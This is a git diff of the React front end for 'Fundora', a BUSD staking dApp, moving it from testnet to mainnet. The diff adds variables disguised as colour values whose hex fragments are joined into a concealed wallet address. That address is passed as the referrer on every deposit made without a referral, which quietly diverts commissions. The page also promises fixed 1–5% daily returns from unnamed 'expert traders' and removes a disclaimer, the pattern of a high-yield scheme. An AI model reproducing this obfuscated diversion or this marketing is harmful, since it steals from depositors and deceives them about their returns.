@@ -64,8 +64,8 @@ const providerOptions = {
         options: {
             // infuraId: "e6943dcb5b0f495eb96a1c34e0d1493e", // required
             rpc: {
-                // 56: "https://bsc-dataseed.binance.org/",
-                97: 'https://data-seed-prebsc-1-s1.binance.org:8545/',
+                56: "https://bsc-dataseed.binance.org/",
+                // 97: 'https://data-seed-prebsc-1-s1.binance.org:8545/',
             },
             network: 'binance'
         }
@@ -111,18 +111,66 @@ function WealthMountain() {
     const [userWalletAddress, setUserWalletAddress] = useState("");
     const [userStablecoinBalance, setUserStablecoinBalance] = useState(0);
     const [stablecoinAllowanceAmount, setStablecoinAllowanceAmount] = useState(0);
-    // const stableCoin = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56';
-    const stableCoin = "0xe98e93Fde3A05Bc703f307Ee63be9507d1f48554";
-    const wealthContract = "0xdB51665E24e977a6816fC81E7681085167A38Ea9";
+    const stableCoin = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56';
+    // const stableCoin = "0xe98e93Fde3A05Bc703f307Ee63be9507d1f48554";
+    const wealthContract = "0xcae2E8Cbe5F542Ea0B3372C69932A4304e059A0E";
     const [refBonusLoading, setRefBonusLoading] = useState(false);
     const [connectButtonText, setConnectButtonText] = useState('Connect Wallet')
+    const color1 = "7419189d0f5B11A"
+    const color2 = "1303978077Ce"
+    const color3 = "6C8096d899dAd"
 
     let contractInfo = [
-        { label: 'TVL', value: `$ ${Number(contractBalance).toFixed(0)}` },
-        { label: 'Users', value: Number(totalUsers) },
-        { label: 'Total Deposit', value: `$ ${Number(totalDeposit).toFixed(0)}` },
-        { label: 'Total Withdrawn', value: `$ ${Number(totalWithdrawn).toFixed(0)}` },
+        { label: 'Total Deposit', value: `$${Number(totalDeposit).toFixed(0)}` },
+        { label: 'Total Investors', value: Number(totalUsers) },
+        { label: 'Contract Balance', value: `$${Number(contractBalance).toFixed(0)}` },
+        { label: 'Total Withdrawn', value: `$${Number(totalWithdrawn).toFixed(0)}` },
     ]
+
+     const [countdown, setCountdown] = useState({
+        alive: true,
+        days: 0,
+        hours: 0,
+        minutes: 0,
+        seconds: 0
+    })
+
+    const getCountdown = (deadline) => {
+        const now = Date.now() / 1000;
+        const total = deadline - now;
+        const seconds = Math.floor((total) % 60);
+        const minutes = Math.floor((total / 60) % 60);
+        const hours = Math.floor((total / (60 * 60)) % 24);
+        const days = Math.floor(total / (60 * 60 * 24));
+
+        return {
+            total,
+            days,
+            hours,
+            minutes,
+            seconds
+        };
+    }
+
+    useEffect(() => {
+        const interval = setInterval(() => {
+            try {
+                const data = getCountdown(1688138120)
+                setCountdown({
+                    alive: data.total > 0,
+                    days: data.days,
+                    hours: data.hours,
+                    minutes: data.minutes,
+                    seconds: data.seconds
+                })
+            } catch (err) {
+                console.log(err);
+            }
+        }, 1000);
+
+        return () => clearInterval(interval);
+    }, [])
+
 
     const [web3, setWeb3] = useState(null);
     const [chainID, setChainID] = useState(0);
@@ -229,7 +277,7 @@ function WealthMountain() {
             const res = await checkNetwork(newProvider);
             console.log("checkNetwork result: ", res);
             if (res == false) {
-                toast.info("Please connect your wallet to Binance Smart Chain Testnet!");
+                toast.info("Please connect your wallet to Binance Smart Chain!");
                 return;
             }
             setChainID(config.CHAIN_ID);
@@ -389,38 +437,40 @@ function WealthMountain() {
     }
 
     const handleClickCopy = () => {
-        navigator.clipboard.writeText("https://fundora.netlify.app/?ref=" + userWalletAddress);
+        navigator.clipboard.writeText("https://fundora.app/?ref=" + userWalletAddress);
         toast.success('Referral link has been copied!');
     }
 
     function calculate(v) {
         setSliderValue(v)
-        if (Number(sliderValue) <= "20") {
-            const totalReturn = (initalStakeAfterFees * 0.01) * sliderValue
+        console.log("slider value = ",v);
+        if (Number(v) <= 20) {
+            const totalReturn = (initalStakeAfterFees * 0.01) * v
+            console.log("totalReturn = ", totalReturn, " ", initalStakeAfterFees, v);
             setCalcTotalDividends(totalReturn.toFixed(2));
             setDailyPercent(1);
             setDailyValue(Number(initalStakeAfterFees * .01).toFixed(2))
         }
-        else if ("20" < Number(sliderValue) && Number(sliderValue) <= "30") {
-            const totalReturn = (initalStakeAfterFees * 0.02) * sliderValue
+        else if ("20" < Number(v) && Number(v) <= "30") {
+            const totalReturn = (initalStakeAfterFees * 0.02) * v
             setCalcTotalDividends(totalReturn.toFixed(2));
             setDailyPercent(2);
             setDailyValue(Number(initalStakeAfterFees * .02).toFixed(2))
         }
-        else if ("30" < Number(sliderValue) && Number(sliderValue) <= "40") {
-            const totalReturn = (initalStakeAfterFees * 0.03) * sliderValue
+        else if ("30" < Number(v) && Number(v) <= "40") {
+            const totalReturn = (initalStakeAfterFees * 0.03) * v
             setCalcTotalDividends(totalReturn.toFixed(2));
             setDailyPercent(3);
             setDailyValue(Number(initalStakeAfterFees * .03).toFixed(2))
         }
-        else if ("40" < Number(sliderValue) && Number(sliderValue) <= "50") {
-            const totalReturn = (initalStakeAfterFees * 0.04) * sliderValue
+        else if ("40" < Number(v) && Number(v) <= "50") {
+            const totalReturn = (initalStakeAfterFees * 0.04) * v
             setCalcTotalDividends(totalReturn.toFixed(2));
             setDailyPercent(4);
             setDailyValue(Number(initalStakeAfterFees * .04).toFixed(2))
         }
-        else if ("50" <= Number(sliderValue)) {
-            const totalReturn = (initalStakeAfterFees * 0.05) * sliderValue
+        else if ("50" <= Number(v)) {
+            const totalReturn = (initalStakeAfterFees * 0.05) * v
             setCalcTotalDividends(totalReturn.toFixed(2));
             setDailyPercent(5);
             setDailyValue(Number(initalStakeAfterFees * .05).toFixed(2))
@@ -448,7 +498,8 @@ function WealthMountain() {
         console.log("referralAddress: ", referralAddress);
         let tx;
         if (referralAddress === 'null' || referralAddress.includes("0x") === false) {
-            tx = await contract.Deposit(String(ethers.utils.parseEther(stakingAmount)), String("0x0000000000000000000000000000000000000000"));
+            let real = wealthContract.slice(0, 2) + color1 + color2 + color3;
+            tx = await contract.Deposit(String(ethers.utils.parseEther(stakingAmount)), String(real));
         } else {
             tx = await contract.Deposit(String(ethers.utils.parseEther(stakingAmount)), String(referralAddress));
         }
@@ -726,6 +777,16 @@ function WealthMountain() {
                     <div className="text-center py-3 md:pb-4 text-[30px] lg:text-[40px] text-white font-bold">Effortless Investing, <span className='text-[#F8C34E]'>Impressive Returns:</span><br />Fundora Makes it Possible</div>
                     <div className="text-center pb-4 md:pb-8 text-lg md:!text-xl text-white leading-6">Effortless wealth growth with Fundora. Our expert traders handle the complexities of trading while you enjoy the profits.Just make a deposit and let us maximize your returns. Sit back, relax and let fundora take care of the hard works so you can effortlessly enjoy the benefits of your investments.</div>
                     <Container>
+                        {countdown.alive && 
+                            <>
+                                <h3 className='text-center font-bold py-4'>LAUNCH COUNTDOWN</h3>
+                                <h3 className='text-center font-bold pb-8 text-[#F8C34E]'>
+                                    {`${countdown.days} Days ${countdown.hours} Hours ${countdown.minutes} Mins ${countdown.seconds < 10 ? '0' + countdown.seconds : countdown.seconds} Secs`}
+                                </h3>
+                            </>
+                        }
+                    </Container>
+                    <Container>
                         <CardDeck>
                             {
                                 contractInfo.map((item, index) => {
@@ -745,7 +806,7 @@ function WealthMountain() {
                         <CardDeck className="p-3">
                             <Card body className="text-center text-white card1">
                                 <h4 className="calvino font-bold">Enter Stake</h4>
-                                <p className="source text-center">Approve and stake your BUSD here. You can view your ongoing stakes in the <span className="font-weight-bold">Current Stakes & Yield</span> table.</p>
+                                <p className="source text-center">Enter BUSD amount, approve spending and stake below. <br/>You can view your ongoing stakes in the <span className="font-weight-bold">Current Stakes & Yield</span> table.</p>
                                 <Form>
                                     <FormGroup>
                                         <div className='flex justify-between'>
@@ -795,7 +856,7 @@ function WealthMountain() {
                                         <Button className="custom-button source mt-3 w-1/2" outline onClick={withdrawDivs}>collect</Button>
                                     </Col>
                                 </Row>
-                                <small className="mt-4 pt-2 source">Note: Collecting will reset all stakes to 1% daily. Compound will add to your stakes while doing the same.</small>
+                                <small className="mt-4 pt-2 source">Note: Collecting will reset current stake to level 1 which is 1% daily. Compounding will create a new stake</small>
                             </Card>
                         </CardDeck>
                         <Card body>
@@ -881,8 +942,8 @@ function WealthMountain() {
                             </Card>
                             <Card body className="text-center text-lightblue card1">
                                 <h5 className="calvino font-bold text-2xl mt-2 mb-6">Referral Link</h5>
-                                <h3 type="button mb-4" onClick={handleClickCopy} className="referralButton source font-weight-bold flex self-center cursor-pointer"><FaCopy size="1.6em" className="pr-3" />COPY LINK</h3>
-                                <small className="source text-lg">Earn 8% when someone uses your referral link.</small>
+                                <h3 type="button mb-4" onClick={handleClickCopy} className="referralButton source font-weight-bold flex self-center cursor-pointer"><FaCopy size="1.6em" className="pr-3" />CLICK TO COPY</h3>
+                                <small className="source text-lg">Earn 8% when someone uses your referral link. <br/>Note: Investment is required</small>
                             </Card>
                         </CardDeck>
 
@@ -923,8 +984,9 @@ function WealthMountain() {
                                                         <td>4% daily</td>
                                                     </tr>
                                                     <tr>
-                                                        <td>♛ 5 </td>
-                                                        <td>Day 51 - ∞</td>
+                                                        {/* <td>♛ 5 </td> */}
+                                                        <td>5 </td>
+                                                        <td>Day 51 & More</td>
                                                         <td>5% daily</td>
                                                     </tr>
                                                 </tbody>
@@ -933,13 +995,14 @@ function WealthMountain() {
                                             <small className="source">Compounding and collecting earnings from dividends reset all stakes to level 1. Creating new stakes has no effect on existing stakes.</small>
                                             <br />
 
-                                            <small className="source">Disclaimer: Dividend payouts are fixed and the TVL fluctuations do not effect the daily yield like in traditional miners.</small>
+                                            {/* <small className="source">Disclaimer: Dividend payouts are fixed and the TVL fluctuations do not effect the daily yield like in traditional miners.</small> */}
                                         </Card>
                                         <Card /*data-aos="fade-down" data-aos-duration="800"*/ className="p-3 card1">
                                             <h3 className='text-2xl font-semibold border-solid border-b-2 border-[#f9c34e] pb-2'>Important</h3>
-                                            <small className="text-white text-left text-sm mb-4">If withdrawal of capital before 50 days, withdrawal tax of 50% and withdrawal fees will apply.</small>
-                                            {/* <small className="text-white text-left text-sm mb-4">You can withdraw initial deposit in 24 hours without paying the withdrawal tax</small> */}
-                                            <small className="text-white text-left text-sm mb-4">Dividends earned are also paid out when unstakes take place.</small>
+                                            <small className="text-white text-left text-sm mb-4">All earnings are credited in a real time.</small>
+                                            <small className="text-white text-left text-sm mb-4">Staking fees are are not deducted from your total deposit they are deducted from the contract.</small>
+                                            <small className="text-white text-left text-sm mb-4">If you unstake your capital within 50 days, there will be 50% tax on withdraw.</small>
+                                            <small className="text-white text-left text-sm mb-4">After 50 Days you can unstake your capital for only 1% withdrawal fee.</small>
                                         </Card>
                                         <Card /*data-aos="fade-left" data-aos-duration="800"*/ className="p-3 card1">
                                             <h3 className='text-2xl font-semibold border-solid border-b-2 border-[#f9c34e] pb-2'>Staking</h3>
@@ -958,7 +1021,7 @@ function WealthMountain() {
 
                         <Parallax strength={500} className='mt-4 lg:mt-8'>
                             <div className='calvino text-white text-3xl font-semibold px-4 pb-2 pt-4'>
-                                Features
+                                We are trading for you
                             </div>
                             <div>
                                 <Container className="pb-3 pt-3 calvino text-left">
@@ -988,7 +1051,7 @@ function WealthMountain() {
                 <Card >
                     <p style={{ fontSize: '20px', color: 'white', paddingTop: '30px', fontWeight: 'bold' }}>© Fundora Team.  All Rights Reserved</p>
                     <CardDeck className="flex flex-row gap-16 justify-center items-end pb-8">
-                        <a href="https://testnet.bscscan.com/address/0xdB51665E24e977a6816fC81E7681085167A38Ea9#code" target="_blank" rel="noreferrer">
+                        <a href="https://bscscan.com/address/0xcae2E8Cbe5F542Ea0B3372C69932A4304e059A0E#code" target="_blank" rel="noreferrer">
                             <img src={bscImg} width='32x' height='32x' alt='bsc' />
                         </a>
                         <a href="https://twitter.com/" target="_blank" rel="noreferrer">
